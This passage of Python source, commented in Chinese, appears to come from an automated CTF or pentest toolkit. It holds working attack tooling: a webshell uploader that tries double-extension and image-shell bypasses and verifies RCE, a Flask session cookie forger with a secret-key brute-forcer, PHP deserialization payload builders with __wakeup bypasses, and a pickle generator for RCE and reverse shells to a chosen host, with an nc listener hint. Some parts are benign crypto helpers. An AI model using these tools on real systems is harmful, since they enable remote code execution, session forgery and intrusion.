                    "shell_type": shell_key,
                    "all_results": results,
                    "suggestion": f"扩展名{ext}上传成功且RCE验证通过! shell_url={verify_url}",
                }

        # === 策略4: 双扩展名 Apache多后缀 ===
        for ext in [".php.jpg", ".php.gif", ".php.png", ".phtml.jpg"]:
            filename = f"shell{ext}"
            content = self.WEBSHELLS["php_script"]["content"]
            ct = "image/jpeg" if "jpg" in ext else ("image/gif" if "gif" in ext else "image/png")
            result = await self.upload(url, filename, content, field_name, ct, extra_fields)
            file_path = extract_path(result.get("content", ""), filename)
            verify_url = urljoin(base_url, file_path)
            verify = await verify_rce(verify_url, "eval")
            results.append({
                "strategy": f"4_double_ext_{ext}",
                "filename": filename,
                "upload_status": result.get("status"),
                "verify": verify,
                "shell_url": verify_url if verify.get("rce_verified") else None,
            })
            if verify.get("rce_verified"):
                return {
                    "success": True,
                    "strategy_used": f"4_double_ext_{ext}",
                    "shell_url": verify_url,
                    "shell_type": "php_script",
                    "all_results": results,
                    "suggestion": f"双扩展名{ext}绕过成功! shell_url={verify_url}",
                }

        # === 策略5: 图片马直接上传（含PHP代码的.jpg，依赖服务器配置解析） ===
        for shell_key in ["php_jpg_script", "php_gif_script", "php_jpg", "php_gif"]:
            shell = self.WEBSHELLS[shell_key]
            result = await self.upload(url, shell["filename"], shell["content"],
                                        field_name, shell["content_type"], extra_fields)
            file_path = extract_path(result.get("content", ""), shell["filename"])
            verify_url = urljoin(base_url, file_path)
            verify = await verify_rce(verify_url, "eval")
            results.append({
                "strategy": f"5_image_shell_{shell_key}",
                "filename": shell["filename"],
                "upload_status": result.get("status"),
                "verify": verify,
                "shell_url": verify_url if verify.get("rce_verified") else None,
            })
            if verify.get("rce_verified"):
                return {
                    "success": True,
                    "strategy_used": f"5_image_shell_{shell_key}",
                    "shell_url": verify_url,
                    "shell_type": shell_key,
                    "all_results": results,
                    "suggestion": f"图片马上传成功且RCE验证通过! shell_url={verify_url}",
                }

        # === 策略6: phpinfo信息泄露 ===
        for info_key in ["php_info", "php_gif_info", "php_env"]:
            info_shell = self.WEBSHELLS[info_key]
            result = await self.upload(url, info_shell["filename"], info_shell["content"],
                                        field_name, info_shell["content_type"], extra_fields)
            file_path = extract_path(result.get("content", ""), info_shell["filename"])
            verify_url = urljoin(base_url, file_path)
            verify_type = "phpinfo" if "info" in info_key else "direct"
            verify = await verify_rce(verify_url, verify_type)
            results.append({
                "strategy": f"6_info_leak_{info_key}",
                "filename": info_shell["filename"],
                "upload_status": result.get("status"),
                "verify": verify,
                "info_url": verify_url if verify.get("rce_verified") else None,
                "note": "若命令执行被disable_functions限制，访问此URL查看phpinfo/环境变量中的flag",
            })
            if verify.get("rce_verified"):
                return {
                    "success": True,
                    "strategy_used": f"6_info_leak_{info_key}",
                    "info_url": verify_url,
                    "shell_type": info_key,
                    "all_results": results,
                    "suggestion": (
                        f"信息泄露成功! 访问 {verify_url} 查看phpinfo/环境变量。\n"
                        "用http_get访问该URL，在返回内容中搜索flag/FLAG/secret等关键词。\n"
                        "也可上传php_env模板查看$_ENV和$_SERVER变量。"
                    ),
                }

        # === 全部失败 ===
        uploaded = [r for r in results if r.get("upload_status") in (200, 201) or r.get("htaccess_uploaded")]
        verified = [r for r in results if r.get("verify", {}).get("rce_verified")]

        return {
            "success": False,
            "total_strategies_tried": len(results),
            "uploaded_count": len(uploaded),
            "verified_count": len(verified),
            "all_results": results,
            "suggestion": (
                f"尝试了{len(results)}个策略，{len(uploaded)}个上传成功，但0个RCE验证通过。\n"
                "可能原因及建议:\n"
                "1. 上传路径推测错误 → 检查上传响应中的路径线索，用http_get手动访问\n"
                "2. .htaccess被禁用(AllowOverride None) → 尝试.user.ini(需PHP-FPM)\n"
                "3. PHP代码被过滤 → 检查上传响应，确认内容是否被修改\n"
                "4. 文件不可直接访问 → 检查是否存在文件包含漏洞(php://filter)\n"
                "5. 命令执行被禁(disable_functions) → 用file_upload_webshell上传php_info模板\n"
                "6. 自定义尝试: 用file_upload工具手动构造上传内容和文件名"
            ),
        }


class FlaskSessionTool:
    """Flask会话Cookie管理工具：调用flask-session-cookie-manager外部工具

    开源项目: https://github.com/noraj/flask-session-cookie-manager
    本地路径: thirdparty/flask-session-cookie-manager-master/flask_session_cookie_manager3.py
    """

    TOOL_DIR = os.path.join(os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))), "src", "thirdparty", "flask-session-cookie-manager-master")
    TOOL_SCRIPT = os.path.join(TOOL_DIR, "flask_session_cookie_manager3.py")
    DOWNLOAD_URL = "https://github.com/noraj/flask-session-cookie-manager/archive/refs/heads/master.zip"
    ZIP_NAME = "flask-session-cookie-manager-master.zip"

    def _ensure_tool(self) -> bool:
        """检查工具是否存在，不存在则自动下载"""
        if os.path.isfile(self.TOOL_SCRIPT):
            return True

        project_root = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
        zip_path = os.path.join(project_root, self.ZIP_NAME)

        # 尝试从项目根目录的zip解压
        if os.path.isfile(zip_path):
            import zipfile
            try:
                with zipfile.ZipFile(zip_path, 'r') as zf:
                    zf.extractall(os.path.join(project_root, "src", "thirdparty"))
                if os.path.isfile(self.TOOL_SCRIPT):
                    return True
            except Exception:
                pass

        # 从GitHub下载
        import urllib.request
        try:
            logger.info(f"flask-session-cookie-manager未找到，正在从GitHub下载...")
            urllib.request.urlretrieve(self.DOWNLOAD_URL, zip_path)
            import zipfile
            with zipfile.ZipFile(zip_path, 'r') as zf:
                zf.extractall(os.path.join(project_root, "src", "thirdparty"))
            return os.path.isfile(self.TOOL_SCRIPT)
        except Exception as e:
            logger.error(f"下载flask-session-cookie-manager失败: {e}")
            return False

    async def decode(self, cookie: str, secret_key: str = "") -> Dict[str, Any]:
        """解码Flask session cookie（使用flask-session-cookie-manager工具）"""
        if not self._ensure_tool():
            return {"success": False, "error": "flask-session-cookie-manager工具不可用，且自动下载失败。请手动下载: https://github.com/noraj/flask-session-cookie-manager-manager"}

        cmd = [sys.executable, self.TOOL_SCRIPT, "decode", "-c", cookie]
        if secret_key:
            cmd.extend(["-s", secret_key])

        try:
            proc = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=10)
            stdout_str = stdout.decode("utf-8", errors="replace").strip()
            stderr_str = stderr.decode("utf-8", errors="replace").strip()

            if proc.returncode != 0:
                return {"success": False, "error": f"解码失败(returncode={proc.returncode}): {stderr_str or stdout_str}"}

            if stdout_str.startswith("[Decoding error]"):
                return {"success": False, "error": stdout_str}

            # 尝试解析为dict
            try:
                import ast
                decoded_data = ast.literal_eval(stdout_str)
            except Exception:
                decoded_data = stdout_str

            return {
                "success": True,
                "data": decoded_data,
                "raw": stdout_str,
                "verified": bool(secret_key),
                "tool": "flask-session-cookie-manager",
            }
        except asyncio.TimeoutError:
            return {"success": False, "error": "工具执行超时"}
        except Exception as e:
            return {"success": False, "error": f"执行失败: {str(e)}"}

    async def encode(self, data: str, secret_key: str) -> Dict[str, Any]:
        """使用secret_key伪造Flask session cookie（使用flask-session-cookie-manager工具）

        data参数格式: Python dict字符串，如 "{'user': 'admin', 'is_admin': True}"
        """
        if not self._ensure_tool():
            return {"success": False, "error": "flask-session-cookie-manager工具不可用，且自动下载失败"}

        # flask-session-cookie-manager的encode命令接受Python dict字符串
        cmd = [sys.executable, self.TOOL_SCRIPT, "encode", "-s", secret_key, "-t", data]

        try:
            proc = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=10)
            stdout_str = stdout.decode("utf-8", errors="replace").strip()
            stderr_str = stderr.decode("utf-8", errors="replace").strip()

            if proc.returncode != 0:
                return {"success": False, "error": f"编码失败(returncode={proc.returncode}): {stderr_str or stdout_str}"}

            if stdout_str.startswith("[Encoding error]"):
                return {"success": False, "error": stdout_str}

            return {
                "success": True,
                "cookie": stdout_str,
                "data": data,
                "secret_key": secret_key,
                "tool": "flask-session-cookie-manager",
                "usage": "将返回的cookie值设置到浏览器Cookie中的session字段",
            }
        except asyncio.TimeoutError:
            return {"success": False, "error": "工具执行超时"}
        except Exception as e:
            return {"success": False, "error": f"执行失败: {str(e)}"}

    async def brute_secret(self, cookie: str, wordlist: str = "") -> Dict[str, Any]:
        """爆破Flask session secret_key

        原理: 用flask-session-cookie-manager的decode(带secret_key)逐一尝试验证签名
        """
        if not self._ensure_tool():
            return {"success": False, "error": "flask-session-cookie-manager工具不可用，且自动下载失败"}

        default_wordlist = [
            "secret", "password", "flask", "app", "key", "admin",
            "flask-secret", "super-secret", "changeme", "default",
            "sk-secret", "secret-key", "flask_secret_key",
            "this-is-a-secret", "development", "production",
            "123456", "abc123", "qwerty", "letmein",
            "SDLFWJDSLFJWQEOIFJSDF", "keyboard_cat", "my_secret",
            "your_secret_key", "secret_key", "FLASK_SECRET_KEY",
        ]

        words = [w.strip() for w in wordlist.split(",")] if wordlist else default_wordlist

        for secret in words:
            cmd = [sys.executable, self.TOOL_SCRIPT, "decode", "-s", secret, "-c", cookie]
            try:
                proc = await asyncio.create_subprocess_exec(
                    *cmd,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE,
                )
                stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=5)
                stdout_str = stdout.decode("utf-8", errors="replace").strip()

                if not stdout_str.startswith("[Decoding error]"):
                    import ast
                    try:
                        decoded_data = ast.literal_eval(stdout_str)
                    except Exception:
                        decoded_data = stdout_str

                    return {
                        "success": True,
                        "secret_key": secret,
                        "decoded_data": decoded_data,
                        "tool": "flask-session-cookie-manager",
                    }
            except asyncio.TimeoutError:
                continue
            except Exception:
                continue

        return {
            "success": False,
            "error": f"未在字典中找到匹配的secret_key（共尝试{len(words)}个）",
            "tried": len(words),
            "tool": "flask-session-cookie-manager",
        }


class DeserializeTool:
    """PHP/Python反序列化payload生成工具"""

    PHP_GADGETS = {
        "rce": "__destruct",
        "wakeup": "__wakeup",
        "toString": "__toString",
        "call": "__call",
    }

    def _build_php_properties(self, props_json: str) -> str:
        """根据JSON构建PHP序列化属性串

        props_json格式: JSON数组, 每个元素: {name, value, visibility}
        visibility: public/protected/private, 默认public
        """
        try:
            if isinstance(props_json, str):
                props_list = json.loads(props_json)
            else:
                props_list = props_json
        except (json.JSONDecodeError, TypeError):
            return None

        parts = []
        for prop in props_list:
            name = prop.get("name", "")
            value = prop.get("value", "")
            visibility = prop.get("visibility", "public")

            if visibility == "protected":
                encoded_name = f'\x00*\x00{name}'
            elif visibility == "private":
                cls_name = prop.get("class", "")
                encoded_name = f'\x00{cls_name}\x00{name}'
            else:
                encoded_name = name

            if value is None or value == "":
                parts.append(f's:{len(encoded_name)}:"{encoded_name}";N;')
            else:
                parts.append(f's:{len(encoded_name)}:"{encoded_name}";s:{len(str(value).encode("utf-8"))}:"{value}";')

        return "".join(parts)

    async def php_generate(self, gadget_type: str = "rce", command: str = "id",
                           class_name: str = "Exploit", props: str = "",
                           wakeup_bypass: bool = False, extra_count: int = 0) -> Dict[str, Any]:
        """生成PHP反序列化payload

        Args:
            gadget_type: rce/wakeup/phar/tostring/custom
            command: 要执行的命令 (简单模式下使用)
            class_name: PHP类名 (动态计算长度)
            props: JSON格式属性列表, 格式: [{"name":"a","value":"system('id')"},...]
            wakeup_bypass: 是否启用__wakeup()绕过 (CVE-2016-7124, 属性数>实际属性数)
            extra_count: 额外增加的属性数量 (用于绕过__wakeup和WAF)
        """
        gadget_type = gadget_type.lower().strip()
        class_len = len(class_name)

        if gadget_type == "phar":
            import struct
            if props:
                inner = self._build_php_properties(props)
                if inner is None:
                    return {"success": False, "error": "props JSON解析失败"}
            else:
                inner = f's:3:"cmd";s:{len(command)}:"{command}";'

            manifest = b""
            manifest += struct.pack(">I", 1) + struct.pack(">I", 0)
            metadata = inner + "}"
            manifest += struct.pack(">I", len(metadata))
            manifest += metadata.encode()
            signature = hashlib.sha1(manifest).digest()
            payload_b64 = base64.b64encode(manifest + signature + b"GBMB").decode()
            return {
                "success": True,
                "gadget": "phar",
                "command": command,
                "payload": "[phar格式payload，base64编码]",
                "payload_b64": payload_b64,
                "usage": "将base64解码后保存为.phar文件上传，或通过phar://协议触发",
            }

        if gadget_type == "custom" or props:
            inner = self._build_php_properties(props) if props else ""
            if inner is None:
                return {"success": False, "error": "props JSON解析失败"}

            actual_count = inner.count(';') // 2
            if wakeup_bypass:
                total_count = actual_count + (extra_count if extra_count > 0 else 1)
            else:
                total_count = actual_count

            payload = f'O:{class_len}:"{class_name}":{total_count}:{{{inner}}}'
        elif gadget_type in ("rce", "wakeup"):
            prop_name = "cmd"
            prop_val = command
            inner = f's:{len(prop_name)}:"{prop_name}";s:{len(prop_val)}:"{prop_val}";'
            if wakeup_bypass:
                total_count = 1 + (extra_count if extra_count > 0 else 1)
                decoy_name = "x"
                decoy_val = "1"
                inner += f's:{len(decoy_name)}:"{decoy_name}";s:{len(decoy_val)}:"{decoy_val}";'
            else:
                total_count = 1
            payload = f'O:{class_len}:"{class_name}":{total_count}:{{{inner}}}'
        elif gadget_type == "tostring":
            prop_name = "str"
            prop_val = command
            inner = f's:{len(prop_name)}:"{prop_name}";s:{len(prop_val)}:"{prop_val}";'
            if wakeup_bypass:
                total_count = 1 + (extra_count if extra_count > 0 else 1)
                decoy_name = "x"
                decoy_val = "1"
                inner += f's:{len(decoy_name)}:"{decoy_name}";s:{len(decoy_val)}:"{decoy_val}";'
            else:
                total_count = 1
            payload = f'O:{class_len}:"{class_name}":{total_count}:{{{inner}}}'
        else:
            return {"success": False, "error": f"不支持的gadget类型: {gadget_type}，可用: rce, wakeup, phar, tostring, custom"}

        import urllib.parse
        return {
            "success": True,
            "gadget": gadget_type,
            "command": command,
            "class_name": class_name,
            "class_length": class_len,
            "wakeup_bypass": wakeup_bypass,
            "property_count": inner.count(';') // 2,
            "stated_count": total_count,
            "payload": payload,
            "payload_urlencoded": urllib.parse.quote(payload),
            "payload_b64": base64.b64encode(payload.encode()).decode(),
            "usage": "将payload通过GET/POST参数提交，或通过Cookie/Header注入。"
                     "若使用wakeup_bypass，stated_count>实际属性数时__wakeup()不会被调用(CVE-2016-7124)",
        }

    async def php_reference_bypass(self, class_name: str, props_json: str,
                                    command: str = "id") -> Dict[str, Any]:
        """生成PHP引用绕过__wakeup()的反序列化payload

        利用PHP序列化的引用机制(R:)绕过__wakeup()对属性的清空。
        典型场景: __wakeup()会清空 $this->a, 但 __destruct() 中会将 $this->b 赋值为 $this->c,
        如果 $this->a 引用 $this->b, 则赋值操作会通过引用链恢复 $a 的值。

        props_json格式: JSON数组, 按顺序定义属性:
        [
            {
                "name": "b",                    # 属性名
                "type": "object",               # 类型: object(嵌套对象)/string/int/null/reference
                "class": "stdClass",            # 嵌套对象的类名 (type=object时)
                "props": "[]",                  # 嵌套对象的属性JSON (可选)
                "value": "phpinfo();",          # 字符串值 (type=string时)
                "ref": 2                        # 引用ID (type=reference时)
            },
            ...
        ]

        注意: 被引用的属性必须在引用属性之前定义!
        PHP序列化中，引用ID规则: 根对象=1, 后续每个object/array值从2开始递增。
        """
        try:
            if isinstance(props_json, str):
                props_list = json.loads(props_json)
            else:
                props_list = props_json
        except (json.JSONDecodeError, TypeError) as e:
            return {"success": False, "error": f"props JSON解析失败: {str(e)}"}

        class_len = len(class_name)
        parts = []
        object_refs = []
        ref_counter = 1

        for prop in props_list:
            name = prop.get("name", "")
            prop_type = prop.get("type", "string")
            encoded_name = name
            visibility = prop.get("visibility", "public")

            if visibility == "protected":
                encoded_name = f'\x00*\x00{name}'
            elif visibility == "private":
                cls = prop.get("class", "")
                encoded_name = f'\x00{cls}\x00{name}'

            name_len = len(encoded_name)

            if prop_type == "object":
                obj_class = prop.get("class", "stdClass")
                obj_class_len = len(obj_class)
                obj_props = prop.get("props", "[]")

                if isinstance(obj_props, str):
                    obj_props_list = json.loads(obj_props) if obj_props else []
                else:
                    obj_props_list = obj_props

                inner_parts = []
                for op in obj_props_list:
                    oname = op.get("name", "")
                    ovalue = op.get("value", "")
                    inner_parts.append(f's:{len(oname)}:"{oname}";s:{len(str(ovalue).encode("utf-8"))}:"{ovalue}";')

                obj_inner = "".join(inner_parts)
                obj_count = len(obj_props_list)
                ref_counter += 1
                obj_ref_id = ref_counter
                object_refs.append({
                    "prop": name,
                    "ref_id": obj_ref_id,
                    "class": obj_class,
                    "props": obj_props_list
                })

                # PHP序列化: 对象值O:...:{} 后面不需要分号
                parts.append(
                    f's:{name_len}:"{encoded_name}";O:{obj_class_len}:"{obj_class}":{obj_count}:'
                    f'{{{obj_inner}}}'
                )

            elif prop_type == "reference":
                ref_id = prop.get("ref", 2)
                parts.append(f's:{name_len}:"{encoded_name}";R:{ref_id};')

            elif prop_type == "string":
                value = prop.get("value", command)
                parts.append(f's:{name_len}:"{encoded_name}";s:{len(str(value).encode("utf-8"))}:"{value}";')

            elif prop_type == "int":
                value = prop.get("value", 0)
                parts.append(f's:{name_len}:"{encoded_name}";i:{value};')

            elif prop_type == "null":
                parts.append(f's:{name_len}:"{encoded_name}";N;')

            else:
                value = prop.get("value", "")
                parts.append(f's:{name_len}:"{encoded_name}";s:{len(str(value).encode("utf-8"))}:"{value}";')

        inner = "".join(parts)
        prop_count = len(props_list)
        payload = f'O:{class_len}:"{class_name}":{prop_count}:{{{inner}}}'

        import urllib.parse
        return {
            "success": True,
            "class_name": class_name,
            "class_length": class_len,
            "property_count": prop_count,
            "payload": payload,
            "payload_urlencoded": urllib.parse.quote(payload),
            "payload_b64": base64.b64encode(payload.encode()).decode(),
            "object_references": object_refs,
            "usage": (
                "PHP引用绕过__wakeup()。执行流程:\n"
                "1. __wakeup()清空被引用属性时, 关联属性也被清空\n"
                "2. __destruct()中的赋值操作通过引用链恢复属性值\n"
                "3. eval/assert 等最终sink执行恶意代码\n"
                "注意: 被引用属性必须在引用属性之前定义! 引用ID: 根对象=1, 后续object从2开始"
            ),
        }

    async def php_reference_bypass_auto(self, class_name: str, command: str = "ls -la /",
                                         ref_target: str = 'b', ref_src: str = 'a',
                                         command_prop: str = 'c') -> Dict[str, Any]:
        """自动生成引用绕过payload（适用于常见__wakeup+__destruct模式）

        典型场景:
        - __wakeup() 清空 $this->{ref_src}（如$a）
        - __destruct() 中 $this->{ref_target} = $this->{command_prop}（如$b=$c）
        - __destruct() 中 eval($this->{ref_src})（如eval($a)）

        自动处理属性顺序和引用ID，无需手动构造props JSON。

        Args:
            class_name: PHP类名
            command: 要执行的命令（建议先用ls探测）
            ref_target: 被引用的属性名（默认b，被__destruct赋值的目标）
            ref_src: 引用者属性名（默认a，被__wakeup清空且最终被eval）
            command_prop: 存放命令的属性名（默认c）
        """
        props = [
            {"name": ref_target, "type": "object", "class": "stdClass", "props": "[]"},
            {"name": command_prop, "type": "string", "value": command},
            {"name": ref_src, "type": "reference", "ref": 2}
        ]
        return await self.php_reference_bypass(class_name, json.dumps(props), command)

    async def php_pop_chain(self, entry_class: str, chain: str, command: str = "id") -> Dict[str, Any]:
        """根据用户提供的POP链信息生成PHP反序列化payload

        chain参数格式: JSON字符串，例如:
        [{"class":"A","prop":"obj","type":"destruct"},{"class":"B","prop":"cmd","type":"toString","value":"system('id')"}]
        """
        try:
            import json
            if isinstance(chain, str):
                chain_data = json.loads(chain)
            else:
                chain_data = chain

            payload_parts = []
            for item in chain_data:
                cls = item.get("class", "A")
                prop = item.get("prop", "x")
                val = item.get("value", "")
                if val:
                    payload_parts.append(f's:{len(prop)}:"{prop}";s:{len(val)}:"{val}";')
                else:
                    payload_parts.append(f's:{len(prop)}:"{prop}";N;')

            inner = "".join(payload_parts)
            payload = f'O:{len(entry_class)}:"{entry_class}":{len(chain_data)}:{{{inner}}}'

            return {
                "success": True,
                "payload": payload,
                "payload_b64": base64.b64encode(payload.encode()).decode(),
                "chain_info": chain_data,
            }
        except json.JSONDecodeError as e:
            return {"success": False, "error": f"JSON解析失败: {str(e)}"}
        except Exception as e:
            return {"success": False, "error": str(e)}

    async def python_pickle(self, command: str = "id") -> Dict[str, Any]:
        """生成Python pickle反序列化payload"""
        try:
            import pickle
            import os

            class Exploit(object):
                def __reduce__(self):
                    return (os.system, (command,))

            payload = pickle.dumps(Exploit())
            payload_b64 = base64.b64encode(payload).decode()

            return {
                "success": True,
                "command": command,
                "payload_b64": payload_b64,
                "payload_length": len(payload),
                "usage": "将base64解码后的数据提交到反序列化接口，或通过pickle.loads()触发",
            }
        except Exception as e:
            return {"success": False, "error": str(e)}

    async def python_pickle_reverse_shell(self, host: str, port: int) -> Dict[str, Any]:
        """生成Python pickle反弹shell payload"""
        try:
            import pickle
            import pickletools

            payload_code = (
                f"import os;os.system('python3 -c "
                f"\\\"import socket,subprocess,os;"
                f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
                f"s.connect((\\\\\\\"{host}\\\\\\\",{port}));"
                f"os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
                f"subprocess.call([\\\\\\\"/bin/sh\\\\\\\",\\\\\\\"-i\\\\\\\"])\\\"')"
            )

            payload_bytes = (
                b"\x80\x04\x95" + (len(payload_code) + 9).to_bytes(4, 'little') +
                b"\x8c\x08builtins\x8c\x06eval\x93\x94"
            )
            code_bytes = payload_code.encode()
            payload_bytes += len(code_bytes).to_bytes(4, 'little') + code_bytes + b"\x85\x94R\x94."

            payload_b64 = base64.b64encode(payload_bytes).decode()

            return {
                "success": True,
                "host": host,
                "port": port,
                "payload_b64": payload_b64,
                "payload_length": len(payload_bytes),
                "usage": f"先在本地监听端口: nc -lvnp {port}，然后将payload提交到反序列化接口",
            }
        except Exception as e:
            return {"success": False, "error": str(e)}


class CryptoAnalysisTool:
    """加密算法识别与流密码工具

    解决CTF中常见场景: 接口对输入做加密后返回，导致SSTI等payload失效。
    提供加密算法自动识别、RC4/XOR加解密、加密后SSTI payload生成。
    """

    @staticmethod
    def _to_bytes(data: str, encoding: str = "utf-8") -> bytes:
        if isinstance(data, bytes):
            return data
        return data.encode(encoding)

    @staticmethod
    def _decode_ciphertext(ct_str: str):
        """尝试hex/base64解码密文，返回(bytes, format)或(None, None)"""
        ct_str = ct_str.strip()
        # hex
        try:
            if len(ct_str) % 2 == 0 and all(c in "0123456789abcdefABCDEF" for c in ct_str):
                return bytes.fromhex(ct_str), "hex"
        except ValueError:
            pass
        # base64
        try:
            decoded = base64.b64decode(ct_str, validate=True)
            if decoded:
                return decoded, "base64"
        except Exception:
            pass
        # 原始字节
        return ct_str.encode("utf-8", errors="replace"), "raw"

    @staticmethod
    def _rc4(data: bytes, key: bytes) -> bytes:
        S = list(range(256))
        j = 0
        for i in range(256):
            j = (j + S[i] + key[i % len(key)]) & 0xFF
            S[i], S[j] = S[j], S[i]
        i = j = 0
        out = bytearray()
        for byte in data:
            i = (i + 1) & 0xFF
            j = (j + S[i]) & 0xFF
            S[i], S[j] = S[j], S[i]
            out.append(byte ^ S[(S[i] + S[j]) & 0xFF])
        return bytes(out)

    @staticmethod
    def _xor(data: bytes, key: bytes) -> bytes:
        if not key:
            raise ValueError("XOR key不能为空")
        return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))

    async def detect(self, samples: str) -> Dict[str, Any]:
        """根据明文-密文对检测加密算法

        samples: JSON数组字符串, 格式: [{"plaintext":"a","ciphertext":"hex或base64串"}, ...]
        至少提供2组样本以区分XOR和RC4。返回算法类型、密钥(若可推断)、建议工具。
        """
        try:
            if isinstance(samples, str):
                pairs = json.loads(samples)
            else:
                pairs = samples
        except (json.JSONDecodeError, TypeError) as e:
            return {"success": False, "error": f"samples JSON解析失败: {e}"}

        if not pairs or len(pairs) < 1:
            return {"success": False, "error": "至少提供1组明文-密文对"}

        decoded_pairs = []
        for idx, p in enumerate(pairs):
            pt = p.get("plaintext", "")
            ct_str = p.get("ciphertext", "")
            ct, fmt = self._decode_ciphertext(ct_str)
            decoded_pairs.append({
                "plaintext": pt,
                "plaintext_bytes": pt.encode("utf-8", errors="replace"),
                "ciphertext_bytes": ct,
                "ct_format": fmt,
            })

        first = decoded_pairs[0]
        pt0 = first["plaintext_bytes"]
        ct0 = first["ciphertext_bytes"]

        # 1. 长度分析
        length_info = {
            "pt_len": len(pt0),
            "ct_len": len(ct0),
        }
        if len(pt0) == len(ct0):
            cipher_class = "stream"
            length_info["hint"] = "明文密文等长 → 流密码(XOR/RC4)"
        elif len(ct0) % 16 == 0 and len(ct0) > len(pt0):
            cipher_class = "block"
            length_info["hint"] = "密文为16倍数且长于明文 → 块密码(AES-CBC/ECB + PKCS7)"
        elif len(ct0) > len(pt0):
            cipher_class = "block_or_other"
            length_info["hint"] = "密文长于明文 → 可能是块密码或带IV的加密"
        else:
            cipher_class = "unknown"
            length_info["hint"] = "长度关系异常，可能是自定义加密"

        result: Dict[str, Any] = {
            "success": True,
            "cipher_class": cipher_class,
            "length_info": length_info,
            "samples_analyzed": len(decoded_pairs),
        }

        # 2. 流密码: 尝试单字节XOR
        # 注意: 明文必须>=2字节才能区分XOR和RC4(单字节时两者等价)
        if cipher_class == "stream" and len(pt0) >= 2:
            key_byte = pt0[0] ^ ct0[0]
            match_all = True
            for i in range(1, min(len(pt0), len(ct0))):
                if (pt0[i] ^ ct0[i]) != key_byte:
                    match_all = False
                    break
            # 在所有样本上验证
            if match_all:
                for p in decoded_pairs[1:]:
                    pp, cc = p["plaintext_bytes"], p["ciphertext_bytes"]
                    for i in range(min(len(pp), len(cc))):
                        if (pp[i] ^ cc[i]) != key_byte:
                            match_all = False
                            break
                    if not match_all:
                        break

            if match_all:
                result["algorithm"] = "xor_single_byte"
                result["key"] = hex(key_byte)
                result["key_bytes"] = [key_byte]
                result["suggested_tool"] = "xor_crypt"
                result["verify"] = "单字节XOR验证通过，同一key byte对所有样本有效"
                return result

            # 3. 尝试多字节XOR (key长度2~16)
            # 关键: key长度必须严格小于明文长度，使key至少重复一次，否则检查无意义
            # (否则任何短明文都会被误判为XOR，因为key直接从明文推导必然匹配)
            max_klen = min(16, len(pt0) - 1)
            for klen in range(2, max_klen + 1):
                key_bytes = bytes((pt0[i] ^ ct0[i]) for i in range(klen))
                ok = True
                # 在第一个样本上验证(key必须重复，所以i从klen开始)
                for i in range(klen, len(pt0)):
                    if i >= len(ct0):
                        break
                    if (pt0[i] ^ ct0[i]) != key_bytes[i % klen]:
                        ok = False
                        break
                if ok:
                    # 验证其他样本
                    for p in decoded_pairs[1:]:
                        pp, cc = p["plaintext_bytes"], p["ciphertext_bytes"]
                        for i in range(min(len(pp), len(cc))):
                            if (pp[i] ^ cc[i]) != key_bytes[i % klen]:
                                ok = False
                                break
                        if not ok:
                            break
                if ok:
                    # 检查key是否为可打印ASCII (常见情况)
                    printable = all(32 <= b < 127 for b in key_bytes)
                    result["algorithm"] = "xor_multi_byte"
                    result["key"] = key_bytes.decode("utf-8", errors="replace") if printable else key_bytes.hex()
                    result["key_hex"] = key_bytes.hex()
                    result["key_length"] = klen
                    result["suggested_tool"] = "xor_crypt"
                    result["verify"] = f"多字节XOR(长度{klen})验证通过"
                    return result

            # 4. 不是XOR → 可能是RC4
            result["algorithm"] = "rc4_likely"
            result["suggested_tool"] = "rc4_crypt"
            result["note"] = (
                "密文长度等于明文但无法用XOR解释 → 极可能是RC4(密钥流伪随机，无法从明密文对反推密钥)。"
                "需要从源码/配置中提取RC4密钥，再用 rc4_crypt 或 generate_ssti_encrypted_payload 生成payload。"
            )
            # 如果有多组样本，检查RC4特征: 相同明文→相同密文(无nonce)
            if len(decoded_pairs) >= 2:
                same_pt_same_ct = False
                for i in range(len(decoded_pairs)):
                    for j in range(i + 1, len(decoded_pairs)):
                        if decoded_pairs[i]["plaintext"] == decoded_pairs[j]["plaintext"]:
                            same_pt_same_ct = (
                                decoded_pairs[i]["ciphertext_bytes"] == decoded_pairs[j]["ciphertext_bytes"]
                            )
                if same_pt_same_ct is not None:
                    result["rc4_no_nonce"] = same_pt_same_ct
                    if same_pt_same_ct:
                        result["note"] += " 检测到相同明文产生相同密文，确认RC4无nonce(确定性加密)。"
            return result

        # 流密码但明文太短(<2字节): 无法区分XOR/RC4
        if cipher_class == "stream":
            result["algorithm"] = "stream_unknown"
            result["suggested_tool"] = "rc4_crypt"
            result["note"] = (
                "明文长度<2字节，无法区分XOR和RC4(单字节时两者数学等价)。"
                "建议: 1)收集更长明文的样本 2)从源码分析加密算法 3)默认按RC4处理(更常见)"
            )
            return result

        # 5. 块密码: 简单识别
        if cipher_class == "block":
            result["algorithm"] = "aes_likely"
            result["suggested_tool"] = "execute_python"
            result["note"] = (
                "检测到块密码特征(16字节倍数)。AES-CBC需要IV(通常前16字节)，AES-ECB相同明文块→相同密文块。"
                "建议用 execute_python 调用 pycryptodome 实现加解密。"
            )
            return result

        result["algorithm"] = "unknown"
        result["suggested_tool"] = "execute_python"
        result["note"] = "无法自动识别，建议结合源码分析加密逻辑"
        return result

    async def rc4_crypt(self, data: str, key: str, output_format: str = "hex",
                         input_format: str = "utf8") -> Dict[str, Any]:
        """RC4加密/解密(RC4对称，加解密同一操作)

        data: 待处理数据
        key: RC4密钥
        output_format: hex/base64/url/utf8
        input_format: utf8/hex/base64 (data的输入格式)
        """
        try:
            if input_format == "hex":
                data_bytes = bytes.fromhex(data)
            elif input_format == "base64":
                data_bytes = base64.b64decode(data)
            else:
                data_bytes = data.encode("utf-8")
            key_bytes = key.encode("utf-8") if isinstance(key, str) else key

            result_bytes = self._rc4(data_bytes, key_bytes)

            if output_format == "hex":
                output = result_bytes.hex()
            elif output_format == "base64":
